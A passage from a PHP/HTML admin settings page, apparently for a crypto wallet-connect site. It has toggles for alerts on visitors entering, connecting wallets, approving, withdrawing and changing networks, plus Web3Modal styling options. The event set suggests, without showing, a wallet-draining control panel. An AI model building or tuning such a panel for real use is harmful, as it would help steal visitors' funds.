                                />
                            </div>
                            <div class="checkrows">
                                <div class="checkcol">
                                    <label>
                                        <input 
                                            type="hidden" 
                                            name="enter_website" 
                                            value="0" 
                                        />
                                        <input 
                                            type="checkbox" 
                                            name="enter_website" 
                                            value="1" 
                                            <?= $site_settings["enter_website"] ? 'checked' : '' ?>
                                        />
                                        <span>
                                            <?= $locales[$lang]['message-settings-event-enter'] ?>
                                        </span>
                                    </label>
                                    <label>
                                        <input 
                                            type="hidden" 
                                            name="exit_website" 
                                            value="0" 
                                        />
                                        <input 
                                            type="checkbox" 
                                            name="exit_website" 
                                            value="1" 
                                            <?= $site_settings["exit_website"] ? 'checked' : '' ?>
                                        />
                                        <span>
                                            <?= $locales[$lang]['message-settings-event-leave'] ?>
                                        </span>
                                    </label>
                                    <label>
                                        <input 
                                            type="hidden" 
                                            name="chain_request" 
                                            value="0" 
                                        />
                                        <input 
                                            type="checkbox" 
                                            name="chain_request" 
                                            value="1" 
                                            <?= $site_settings["chain_request"] ? 'checked' : '' ?>
                                        />
                                        <span>
                                            <?= $locales[$lang]['message-settings-event-change-network-request'] ?>
                                        </span>
                                    </label>
                                </div>
                                <div class="checkcol">
                                    <label>
                                        <input 
                                            type="hidden" 
                                            name="approve_request" 
                                            value="0" 
                                        />
                                        <input 
                                            type="checkbox" 
                                            name="approve_request" 
                                            value="1" 
                                            <?= $site_settings["approve_request"] ? 'checked' : '' ?>
                                        />
                                        <span> 
                                            <?= $locales[$lang]['message-settings-event-widthdraw-request'] ?>
                                        </span>
                                    </label>
                                    <label>
                                        <input 
                                            type="hidden" 
                                            name="connect_request" 
                                            value="0" 
                                        />
                                        <input 
                                            type="checkbox" 
                                            name="connect_request" 
                                            value="1" 
                                            <?= $site_settings["connect_request"] ? 'checked' : '' ?>
                                        />
                                        <span> 
                                            <?= $locales[$lang]['message-settings-event-connect-request'] ?>
                                        </span>
                                    </label>
                                    <label>
                                        <input 
                                            type="hidden" 
                                            name="approve_cancel" 
                                            value="0" 
                                        />
                                        <input 
                                            type="checkbox" 
                                            name="approve_cancel" 
                                            value="1" 
                                            <?= $site_settings["approve_cancel"] ? 'checked' : '' ?>
                                        />
                                        <span>
                                            <?= $locales[$lang]['message-settings-event-widthdraw-reject'] ?>
                                        </span>
                                    </label>
                                </div>
                                <div class="checkcol">
                                    <label>
                                        <input 
                                            type="hidden" 
                                            name="chain_cancel" 
                                            value="0" 
                                        />
                                        <input 
                                            type="checkbox" 
                                            name="chain_cancel" 
                                            value="1" 
                                            <?= $site_settings["chain_cancel"] ? 'checked' : '' ?>
                                        />
                                        <span>
                                            <?= $locales[$lang]['message-settings-event-change-network-reject'] ?>
                                        </span>
                                    </label>
                                    <label>
                                        <input 
                                            type="hidden" 
                                            name="connect_success" 
                                            value="0" 
                                        />
                                        <input 
                                            type="checkbox" 
                                            name="connect_success" 
                                            value="1" 
                                            <?= $site_settings["connect_success"] ? 'checked' : '' ?>
                                        />
                                        <span>
                                            <?= $locales[$lang]['message-settings-event-connect-success'] ?>
                                        </span>
                                    </label>
                                </div>
                            </div>
                            <button class="savebut">
                                <?= $locales[$lang]['save-changes-button'] ?>
                            </button>
                        </div> 

                        <div id="content4" class="content-div" style="display: none;">
                            <div class="inrow32">
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['w3m-settings-background-url'] ?>
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput1"
                                        name="wc_background_image" 
                                        value="<?= $site_settings["wc_background_image"] ?>"
                                    />
                                </div>
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['w3m-settings-font'] ?>
                                    </label>
                                    <select class="form3" name="wc_font">
                                        <option 
                                            class="option"
                                            value="'Montserrat', sans-serif" 
                                            <?php if ($site_settings["wc_font"] == "'Montserrat', sans-serif") echo "selected"; ?>
                                        >
                                            Montserrat
                                        </option>
                                        <option 
                                            class="option"
                                            value="'Roboto', sans-serif" 
                                            <?php if ($site_settings["wc_font"] == "'Roboto', sans-serif") echo "selected"; ?>
                                        >
                                            Roboto
                                        </option>
                                        <option 
                                            class="option"
                                            value="'Inter', sans-serif" 
                                            <?php if ($site_settings["wc_font"] == "'Inter', sans-serif") echo "selected"; ?>
                                        >
                                            Inter
                                        </option>
                                        <option 
                                            class="option"
                                            value="'Raleway', sans-serif" 
                                            <?php if ($site_settings["wc_font"] == "'Raleway', sans-serif") echo "selected"; ?>
                                        >
                                            Raleway
                                        </option>
                                        <option 
                                            class="option"
                                            value="'Open Sans', sans-serif"
                                            <?php if ($site_settings["wc_font"] == "'Open Sans', sans-serif") echo "selected"; ?>
                                        >
                                            Open Sans
                                        </option>
                                        <option 
                                            class="option"
                                            value="'Lato', sans-serif"
                                            <?php if ($site_settings["wc_font"] == "'Lato', sans-serif") echo "selected"; ?>
                                        >
                                            Lato
                                        </option>
                                        <option 
                                            class="option"
                                            value="'Poppins', sans-serif"
                                            <?php if ($site_settings["wc_font"] == "'Poppins', sans-serif") echo "selected"; ?>
                                        >
                                            Poppins
                                        </option>
                                        <option 
                                            class="option"
                                            value="'Playfair Display', serif" 
                                            <?php if ($site_settings["wc_font"] == "'Playfair Display', serif") echo "selected"; ?>
                                        >
                                            Playfair Display
                                        </option>
                                        <option 
                                            class="option"
                                            value="'Rubik', sans-serif" 
                                            <?php if ($site_settings["wc_font"] == "'Rubik', sans-serif") echo "selected"; ?>
                                        >
                                            Rubik
                                        </option>
                                        <option 
                                            class="option"
                                            value="'Work Sans', sans-serif" 
                                            <?php if ($site_settings["wc_font"] == "'Work Sans', sans-serif") echo "selected"; ?>
                                        >
                                            Work Sans
                                        </option>
                                        <option 
                                            class="option"
                                            value="'Fira Sans', sans-serif" 
                                            <?php if ($site_settings["wc_font"] == "'Fira Sans', sans-serif") echo "selected"; ?>
                                        >
                                            Fira Sans
                                        </option>
                                        <option 
                                            class="option"
                                            value="'IBM Plex Sans', sans-serif" 
                                            <?php if ($site_settings["wc_font"] == "'IBM Plex Sans', sans-serif") echo "selected"; ?>
                                        >
                                            IBM Plex Sans
                                        </option>
                                    
                                    </select>
                                </div>
                            </div>
                            <div class="inrow32">
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['w3m-settings-logo-url'] ?>
                                        <img class="mod2tar" alt="img" src="../static/img/mimg.svg" />
                                    </label>
                                    <input 
                                        type="text" 
                                        class="forminput1" 
                                        name="wc_logo" 
                                        value="<?= $site_settings["wc_logo"] ?>" 
                                    />
                                </div>
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['w3m-settings-accent-color'] ?>
                                    </label>
                                    <span class="color-picker">
                                        <label for="accentColorPicker">
                                            <input 
                                                type="color" 
                                                id="accentColorPicker" 
                                                name="wc_accent_color"
                                                value="<?= $site_settings["wc_accent_color"] ?>"
                                            />
                                        </label>
                                    </span>
                                </div>
                            </div>
                            <div style="width: 79%;" class="inrow32">
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['w3m-settings-topbar-color'] ?>
                                    </label>
                                    <span class="color-picker">
                                        <label for="bgColorPicker">
                                            <input 
                                                type="color" 
                                                id="bgColorPicker"
                                                name="wc_background_color"
                                                value="<?= $site_settings["wc_background_color"] ?>"
                                            />
                                        </label>
                                    </span>
                                </div>
                                <div class="divi">
                                    <label class="form_label">
                                        <?= $locales[$lang]['w3m-settings-logo-color'] ?>
                                    </label>
                                    <span class="color-picker">
                                        <label for="logoColorPicker">
                                            <input 
                                                type="color" 
                                                id="logoColorPicker" 
                                                name="wc_fill_color" 
                                                value="<?= $site_settings["wc_fill_color"] ?>"
                                            />
                                        </label>
                                    </span>
                                </div>
                            </div>
                            <button class="savebut">
                                <?= $locales[$lang]['save-changes-button'] ?>
                            </button>
                        </div> 
                    </form>
                </div>
            </div>
        </div>
        <script src="../static/js/toggle.js"></script>
        <script>
            document.addEventListener("DOMContentLoaded", () => {
                const modalTypeSelect = document.getElementById("modal-type-select")
                const modalCustomizationFields = {
                    'newModal2': {
                        'pallete': [
                            { name: 'Aqua', value: 'aqua-theme' },
                            { name: 'Blue', value: 'blue-theme' },
                            { name: 'Rainbow', value: 'rainbow-theme' }
                        ],
                        'font': [
                            { name: 'Open Sans', value: 'font-open-sans' },
                            { name: 'Mooli', value: 'font-mooli' },
                            { name: 'Comic Neue', value: 'font-comic-neue' },
                            { name: 'Poppins', value: 'font-poppins' }
                        ]
                    },
                    'newModal3': {
                        'pallete': [
                            { name: 'Aqua', value: 'aqua-theme' },
                            { name: 'Orange', value: 'blue-theme' },
                            { name: 'Purple', value: 'rainbow-theme' }
                        ],
                        'font': [
                            { name: 'Open Sans', value: 'font-open-sans' },
                            { name: 'Mooli', value: 'font-mooli' },
                            { name: 'Comic Neue', value: 'font-comic-neue' },
                            { name: 'Poppins', value: 'font-poppins' }
                        ]
                    }
                }
    
                setUpModalCustomizationFields("<?= $site_settings['modal_type'] ?>")
    
                modalTypeSelect.addEventListener("change", (e) => {
                    const modalName = e.target.value;
                    setUpModalCustomizationFields(modalName)
                })
                
                function setUpModalCustomizationFields(modalName) {
                    const selectedModal = modalCustomizationFields[modalName]
    
                    const modalCustomizationRow = document.getElementById("modal-customization")
    
                    const modalPalleteSelect = modalCustomizationRow.querySelector('select[name="modal_pallete"]')
                    const modalFontSelect = modalCustomizationRow.querySelector('select[name="modal_font"]')
    
                    const customizationFieldSelectPointers = {
                        pallete: modalPalleteSelect,
                        font: modalFontSelect
                    }

                    // Delete all options from modal pallete select 
                    while (modalPalleteSelect.options.length > 0) {
                        modalPalleteSelect.remove(0)
                    }
    
                    // Delete all options from modal font select 
                    while (modalFontSelect.options.length > 0) {
                        modalFontSelect.remove(0)
                    }
    
                    // Hide modal pallete select 
                    if (!selectedModal) {
                        modalCustomizationRow.style.display = "none";
                        return
                    }
    
                    modalCustomizationRow.style.display = "flex";
    
                    // Inserting available options to each select
                    for (const field in selectedModal) {
                        const currentSelect = customizationFieldSelectPointers[field]
    
                        for (const option of selectedModal[field]) {
                            const optionElement = document.createElement('option');
                            optionElement.text = option.name;
                            optionElement.value = option.value;
                            optionElement.classList.add("option");
                            currentSelect.appendChild(optionElement);
                        }
                    }
    
                    // Loading default values for modal pallete select and font select 
                    const palleteSelectedElem = '<?php echo $site_settings['modal_pallete'] ?>'
                    if (palleteSelectedElem !== '')
                        modalPalleteSelect.value = palleteSelectedElem
    
                    const fontSelectedElem = '<?php echo $site_settings['modal_font'] ?>'
                    if (fontSelectedElem !== '')
                        modalFontSelect.value = fontSelectedElem
                }
            })

        </script>
    </body>

    </html>